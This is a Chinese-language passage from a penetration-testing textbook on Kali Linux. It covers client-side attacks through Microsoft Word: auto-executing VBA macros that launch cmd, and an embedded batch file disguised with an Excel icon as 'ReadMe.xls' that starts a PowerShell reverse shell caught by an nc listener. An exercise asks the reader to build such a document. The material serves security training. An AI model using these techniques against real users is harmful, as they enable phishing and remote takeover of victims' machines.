
# 使用 Kali Linux 进行渗透测试 2.0

## 13.3.2 Microsoft Word 宏

Microsoft Office `宏` 可能是最古老且广为人知的客户端软件攻击向量。Word 和 Excel 等 Microsoft Office 应用程序允许用户嵌入 `宏`，即一系列组合在一起用于以程序方式完成任务的命令和指令。

组织通常使用宏来管理动态内容并将文档与外部内容相关联。更有趣的是，可以使用 `Visual Basic for Applications (VBA)` 从零开始编写宏。

创建 Microsoft Word 宏只需选择“视图”选项卡并点击“宏”。如图 249 所示，我们只需为宏输入一个名称，并在“宏”下拉菜单中选择将插入的文档名称。当我们点击“创建”时，一个简单的宏框架将插入到我们的文档中。

图 249：创建 Microsoft Word 宏

让我们检查简单的宏（如列表 392 所示）并讨论 VBA 的基础知识。我们 VBA 宏中使用的主过程以关键字 `Sub` 开始并以 `End Sub` 结束。这本质上标记了我们宏的主体。

过程（`Procedure`）与 VBA 中的 `Function`（函数）非常相似。区别在于，`Sub` 过程不能用于表达式，因为它们不返回任何值，而 `Function` 可以。

到此时，我们新定义的宏 `MyMacro()` 仅仅是一个空过程，以及几行以单引号（`'`）开头的代码，单引号标记了 VBA 中注释的开始。

*列表 392 - 默认空宏*

```
Sub MyMacro()
' MyMacro Macro'
End Sub
```

为了像我们之前那样通过 `ActiveX` 调用 `Windows Scripting Host`，我们可以使用 `CreateObject` 函数配合 `Wscript.Shell` `Run` 方法。该宏的代码如下所示：

*列表 393 - 打开 cmd.exe 的宏*

```
Sub MyMacro() 
    CreateObject("Wscript.Shell").Run "cmd"
End Sub
```

由于宏不会自动执行，因此我们必须利用两个预定义的过程，即 `AutoOpen` 过程（在打开新文档时执行）和 `Document_Open` 过程（在重新打开已打开文档时执行）。这两个过程都可以调用我们的自定义过程，从而运行我们的代码。

我们更新后的 VBA 代码在下方的列表 394。

*列表 394 - 自动执行 cmd 的宏*

```
Sub AutoOpen() 
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro() 
    CreateObject("Wscript.Shell").Run "cmd"
End Sub
```

我们必须将包含宏的文档保存为 `.doc` 或旧版本的格式，以支持嵌入宏，但必须避免不支持宏的 `.docx` 格式。

当我们重新打开包含我们宏的文档时，将看到安全警告（图 250），显示宏已被禁用。我们必须点击“启用内容”来运行宏。这是 Microsoft Office 的默认安全设置，并且可以完全禁用宏的使用来防止此类攻击，因为在大多数环境中为了方便使用，宏通常是开启的。

图 250：安全警告

一旦点击“启用内容”，宏就会执行。在真实世界中，如果受害者没有点击按钮，攻击将会失败。

## 13.3.3 嵌入对象 (OLE)

Windows 批处理文件是一种较旧格式，已被更现代的 Windows 脚本语言（如 `VBScript` 和 `PowerShell`）所取代。然而，批处理脚本在 Windows 10 上仍然完全可用，并允许执行应用程序。下面的列表展示了一个初始的概念验证批处理脚本（`launch.bat`），它用于启动 `cmd.exe`。

*列表 399 - 启动 cmd.exe 的简单批处理文件*

```
START cmd.exe
```

接下来，我们将批处理脚本包含到 Word 文档中。打开 Microsoft Word，创建一个新文档，转到“插入”选项卡，并点击“对象”菜单。在这里，我们将选择“从文件创建”标签，并选择我们新创建的批处理脚本 `launch.bat`。

图 251：在 Microsoft Word 中嵌入快捷方式

我们还可以更改 Word 文档中批处理文件的外观，使其看起来更无害。要为此，我们只需勾选“显示为图标”选框并选择“更改图标”，这将弹出图 252 所示的菜单，允许我们进行更改。

图 252：选择图标

尽管这是一个嵌入的批处理文件，但 Microsoft 允许我们为其选择不同的图标并输入标题，受害者将看到这个标题，而不是实际的文件名。在上面的示例中，我们选择了 Microsoft Excel 的图标，并命名为 `ReadMe.xls`，以完全掩盖批处理文件，试图降低受害者的怀疑。接受菜单选项后，批处理文件被嵌入 Microsoft Word 文档中。接下来，受害者必须被诱导双击它并接受图 253 所示的安全警告。

图 253：打开嵌入的快捷方式

当受害者接受警告时，`cmd.exe` 被启动。再次，我们有能力执行任意二进制文件并将其转换为带有 Base64 编码命令的 `PowerShell` 调用。这种转换非常简单，我们只需要将 `cmd.exe` 更改为之前使用的 `PowerShell` 调用即可，如列表 400 所示。

*列表 400 - 启动反向 Shell 的批处理文件*

```
START powershell.exe -nop -w eABZACAAPQgAgAE4AZQB3ACOATwBiGoAZQbj...
```

在嵌入更新后的批处理文件后，双击将产生一个工作的反向 Shell。

*列表 401 - 从我们的 OLE 对象接收到的 Shell*

```
kali@kali:$ nc -lvp 4444
```

### 13.3.3.1 练习

1. 使用 `PowerShell` 负载创建一个批处理文件并将其嵌入 Microsoft Word 文档中，以向你的 Kali 系统发送反向 Shell。

## 13.3.4 规避保护视图

此 Microsoft Word 文档在本地提供时非常有效，但当从互联网提供时（例如通过电子邮件或下载链接），我们必须绕过任何层的保护。
